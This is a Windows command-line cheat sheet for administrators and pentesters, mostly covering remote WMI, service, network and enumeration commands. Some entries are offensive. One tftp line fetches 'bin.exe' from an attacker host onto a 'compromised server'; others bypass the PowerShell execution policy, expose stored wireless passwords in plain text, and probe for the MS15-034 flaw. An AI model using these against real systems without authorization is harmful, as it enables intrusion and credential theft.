<h3><a id="user-content-set-a-static-ip-on-a-remote-box" class="anchor" href="#set-a-static-ip-on-a-remote-box" aria-hidden="true"><svg aria-hidden="true" class="octicon octicon-link" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>Set a static IP on a remote box</h3>

<pre><code>C:\&gt; wmic /node:remotebox nicconfig where Index=1 call EnableStatic ("192.168.1.4"), ("255.255.255.0")
</code></pre>

<h3><a id="user-content-bypass-powershell-execution-policy-restrictions" class="anchor" href="#bypass-powershell-execution-policy-restrictions" aria-hidden="true"><svg aria-hidden="true" class="octicon octicon-link" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>Bypass powershell execution policy restrictions</h3>

<pre><code>PS C:\&gt; powershell -ExecutionPolicy Bypass -Noninteractive -File .\lastboot.ps1
</code></pre>

<h3><a id="user-content-list-running-processes-every-second-on-a-remote-box" class="anchor" href="#list-running-processes-every-second-on-a-remote-box" aria-hidden="true"><svg aria-hidden="true" class="octicon octicon-link" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>List running processes every second on a remote box</h3>

<pre><code>C:\&gt; wmic /node:target process list brief /every:1
</code></pre>

<p><strong>Remove <code>/node:target</code> for localhost</strong></p>

<h3><a id="user-content-get-a-list-of-running-processes-and-their-command-line-arguments-on-a-remote-system" class="anchor" href="#get-a-list-of-running-processes-and-their-command-line-arguments-on-a-remote-system" aria-hidden="true"><svg aria-hidden="true" class="octicon octicon-link" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>Get a list of running processes and their command line arguments on a remote system</h3>

<pre><code>C:\&gt; wmic /node:target process get commandline, name
</code></pre>

<h3><a id="user-content-remotely-enable-and-start-the-volume-shadow-copy-service" class="anchor" href="#remotely-enable-and-start-the-volume-shadow-copy-service" aria-hidden="true"><svg aria-hidden="true" class="octicon octicon-link" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>Remotely enable and start the Volume Shadow Copy Service</h3>

<pre><code>C:\&gt; sc \\target config vss start= auto
C:\&gt; sc \\target start vss
</code></pre>

<h3><a id="user-content-ping-multiple-ips-from-ipstxt--see-live-hosts" class="anchor" href="#ping-multiple-ips-from-ipstxt--see-live-hosts" aria-hidden="true"><svg aria-hidden="true" class="octicon octicon-link" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>Ping multiple IPs from <code>ips.txt</code> &amp; see live hosts</h3>

<pre><code>C:\&gt;for /F %i in (ips.txt) do ping -n 1 %i | find "bytes="
</code></pre>

<h3><a id="user-content-set-global-proxy-in-windows-to-point-to-ie-proxy" class="anchor" href="#set-global-proxy-in-windows-to-point-to-ie-proxy" aria-hidden="true"><svg aria-hidden="true" class="octicon octicon-link" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>Set global proxy in Windows to point to IE proxy</h3>

<pre><code>C:\&gt; netsh winhttp import proxy source=ie
</code></pre>

<h3><a id="user-content-enumerate-list-of-drivers-with-complete-path-information" class="anchor" href="#enumerate-list-of-drivers-with-complete-path-information" aria-hidden="true"><svg aria-hidden="true" class="octicon octicon-link" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>Enumerate list of drivers with complete path information</h3>

<pre><code>C:\&gt; driverquery /FO list /v
</code></pre>

<h3><a id="user-content-view-group-policy-objects-that-have-been-applied-to-a-system" class="anchor" href="#view-group-policy-objects-that-have-been-applied-to-a-system" aria-hidden="true"><svg aria-hidden="true" class="octicon octicon-link" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>View Group Policy Objects that have been applied to a system</h3>

<p><strong>Very useful during pentests</strong></p>

<pre><code>C:\&gt; gpresult /z /h outputfile.html
</code></pre>

<h3><a id="user-content-reset-the-wmi-repository-to-what-it-was-when-the-os-was-installed" class="anchor" href="#reset-the-wmi-repository-to-what-it-was-when-the-os-was-installed" aria-hidden="true"><svg aria-hidden="true" class="octicon octicon-link" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>Reset the WMI repository to what it was when the OS was installed</h3>

<p><strong>Very helpful if you have a corrupt repo</strong></p>

<pre><code>C:\&gt; winmgmt /resetrepository
</code></pre>

<h3><a id="user-content-create-symbolic-links-in-windows-vista-7--higher" class="anchor" href="#create-symbolic-links-in-windows-vista-7--higher" aria-hidden="true"><svg aria-hidden="true" class="octicon octicon-link" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>Create symbolic links in Windows Vista, 7 &amp; higher</h3>

<pre><code>C:\&gt; mklink &lt;link&gt; &lt;target&gt;
C:\&gt; mklink D:\newlink.txt E:\thisexists.txt
</code></pre>

<h3><a id="user-content-enable-the-tftp-client-in-vista--higher" class="anchor" href="#enable-the-tftp-client-in-vista--higher" aria-hidden="true"><svg aria-hidden="true" class="octicon octicon-link" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>Enable the tftp client in Vista &amp; higher</h3>

<pre><code>C:\&gt; ocsetup TFTP /quiet
</code></pre>

<p>Pull files to a <code>compromised server</code>:</p>

<pre><code>C:\&gt; tftp -i attacksrv get bin.exe
</code></pre>

<h3><a id="user-content-obtain-list-of-firewall-rules-on-a-local-system" class="anchor" href="#obtain-list-of-firewall-rules-on-a-local-system" aria-hidden="true"><svg aria-hidden="true" class="octicon octicon-link" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>Obtain list of firewall rules on a local system</h3>

<pre><code>C:\&gt; netsh advfi fi sh rule name=all
</code></pre>

<p><strong>Can be combined with wmic for remote systems</strong></p>

<h3><a id="user-content-get-name-of-current-domain-controller" class="anchor" href="#get-name-of-current-domain-controller" aria-hidden="true"><svg aria-hidden="true" class="octicon octicon-link" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>Get name of current domain controller</h3>

<pre><code>C:\&gt; set log
C:\&gt; nltest /dcname:DOMAIN
</code></pre>

<p>Get list of all DCs:</p>

<pre><code>C:\&gt; nltest /dclist:DOMAIN
</code></pre>

<h3><a id="user-content-look-at-content-cached-in-kernel-mode-on-iis-7-and-higher" class="anchor" href="#look-at-content-cached-in-kernel-mode-on-iis-7-and-higher" aria-hidden="true"><svg aria-hidden="true" class="octicon octicon-link" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>Look at content cached in kernel mode on IIS 7 and higher</h3>

<pre><code>C:\&gt; netsh http sh ca
</code></pre>

<p><strong>Useful when investigating the <code>MS15-034</code> HTTP.sys vuln</strong></p>

<h3><a id="user-content-quick-test-to-check-ms15_034" class="anchor" href="#quick-test-to-check-ms15_034" aria-hidden="true"><svg aria-hidden="true" class="octicon octicon-link" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>Quick test to check <code>MS15_034</code></h3>

<pre><code>C:\&gt; curl -v -H "Range: bytes=234234-28768768" "http://host/a.png" -o a.png
</code></pre>

<p><strong>HTTP 416 = Vulnerable</strong></p>

<p><strong>HTTP 20X = Not vulnerable</strong></p>

<h3><a id="user-content-get-a-list-of-all-open-named-pipes-via-powershell" class="anchor" href="#get-a-list-of-all-open-named-pipes-via-powershell" aria-hidden="true"><svg aria-hidden="true" class="octicon octicon-link" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>Get a list of all open Named pipes via Powershell</h3>

<pre><code>PS C:\&gt; [http://System.IO.Directory ]::GetFiles("\\.\\pipe\\")
</code></pre>

<h3><a id="user-content-possible-venom-detection-on-virtualbox" class="anchor" href="#possible-venom-detection-on-virtualbox" aria-hidden="true"><svg aria-hidden="true" class="octicon octicon-link" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>Possible <code>VENOM</code> detection on VirtualBox</h3>

<pre><code>C:\&gt; vboxmanage list -l vms &gt; a.txt
</code></pre>

<p><strong>Search 'Storage' &amp; 'Floppy'</strong></p>

<h3><a id="user-content-list-rdp-sessions-on-local-or-remote-in-list-format" class="anchor" href="#list-rdp-sessions-on-local-or-remote-in-list-format" aria-hidden="true"><svg aria-hidden="true" class="octicon octicon-link" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>List RDP sessions on local or remote in list format</h3>

<pre><code>PS C:\&gt; qwinsta /server: | foreach {($_.trim() -replace "\s+",",")} | ConvertFrom-Csv
</code></pre>

<h3><a id="user-content-get-a-list-of-service-packs--hotfixes-using-wmic-for-remote-systems-listed-in-file" class="anchor" href="#get-a-list-of-service-packs--hotfixes-using-wmic-for-remote-systems-listed-in-file" aria-hidden="true"><svg aria-hidden="true" class="octicon octicon-link" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>Get a list of service packs &amp; hotfixes using wmic for remote systems listed in file</h3>

<pre><code>C:\&gt; wmic /node:@file /output:out.txt qfe list full
</code></pre>

<h3><a id="user-content-export-wireless-connection-profiles" class="anchor" href="#export-wireless-connection-profiles" aria-hidden="true"><svg aria-hidden="true" class="octicon octicon-link" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>Export wireless connection profiles</h3>

<pre><code>C:\&gt; netsh wlan export profile
</code></pre>

<p><strong><code>key=clear</code> allows plain text passwords</strong></p>

<h3><a id="user-content-unzip-using-powershell" class="anchor" href="#unzip-using-powershell" aria-hidden="true"><svg aria-hidden="true" class="octicon octicon-link" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>Unzip using PowerShell</h3>

<pre><code>PS C:\&gt; Add-Type -A System.IO.Compression.FileSystem;[IO.Compression.ZipFile]::ExtractToDirectory(src,dst)
</code></pre>

<h3><a id="user-content-open-the-network--sharing-center" class="anchor" href="#open-the-network--sharing-center" aria-hidden="true"><svg aria-hidden="true" class="octicon octicon-link" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>Open the Network &amp; Sharing center</h3>

<pre><code>control.exe /name Microsoft.NetworkandSharingCenter
</code></pre>

<p><strong>Create a shortcut of this as <code>ns</code> in <code>PATH</code> for ease</strong></p>

<h3><a id="user-content-remotely-stopstart-ftp-on-several-systems" class="anchor" href="#remotely-stopstart-ftp-on-several-systems" aria-hidden="true"><svg aria-hidden="true" class="octicon octicon-link" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>Remotely stop/start ftp on several systems</h3>

<pre><code>C:\&gt; wmic /node:@ips.txt /user:u /password:p process call create "net &lt;start&gt; msftpsvc"
</code></pre>

<h3><a id="user-content-to-quickly-find-large-files-using-cmd" class="anchor" href="#to-quickly-find-large-files-using-cmd" aria-hidden="true"><svg aria-hidden="true" class="octicon octicon-link" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>To quickly find large files using cmd</h3>

<pre><code>C:\&gt; forfiles /s /c "cmd /c if @fsize gtr 100000 echo @path @fsize bytes"
</code></pre>

<p><strong>Run from the dir you want</strong></p>

<h3><a id="user-content-print-rdp-connections" class="anchor" href="#print-rdp-connections" aria-hidden="true"><svg aria-hidden="true" class="octicon octicon-link" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>Print RDP connections</h3>

<pre><code>for /f "delims=" %i in ('reg query "HKCU\Software\Microsoft\Terminal Server Client\Servers"') do reg query "%i"
</code></pre>

<h3><a id="user-content-list-scheduled-tasks--binaries" class="anchor" href="#list-scheduled-tasks--binaries" aria-hidden="true"><svg aria-hidden="true" class="octicon octicon-link" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>List scheduled tasks &amp; binaries</h3>

<pre><code>C:\&gt; schtasks /query /fo LIST /v
</code></pre>

<p><strong>Weak permissions can be exploited for <code>localprivilege escalation</code></strong></p>

<h3><a id="user-content-display-the-stored-user-names-and-passwords-window" class="anchor" href="#display-the-stored-user-names-and-passwords-window" aria-hidden="true"><svg aria-hidden="true" class="octicon octicon-link" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>Display the "Stored User names and Passwords" window</h3>

<pre><code>C:\&gt; rundll32 keymgr.dll,KRShowKeyMgr
</code></pre>

<h3><a id="user-content-list-namespaces--classes-in-wmi-via-powershell" class="anchor" href="#list-namespaces--classes-in-wmi-via-powershell" aria-hidden="true"><svg aria-hidden="true" class="octicon octicon-link" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>List namespaces &amp; classes in WMI via PowerShell</h3>

<pre><code>PS C:\&gt; gwmi -n root -cl __Namespace | Select name

PS C:\&gt; gwmi -n root\cimv2 -li
</code></pre>

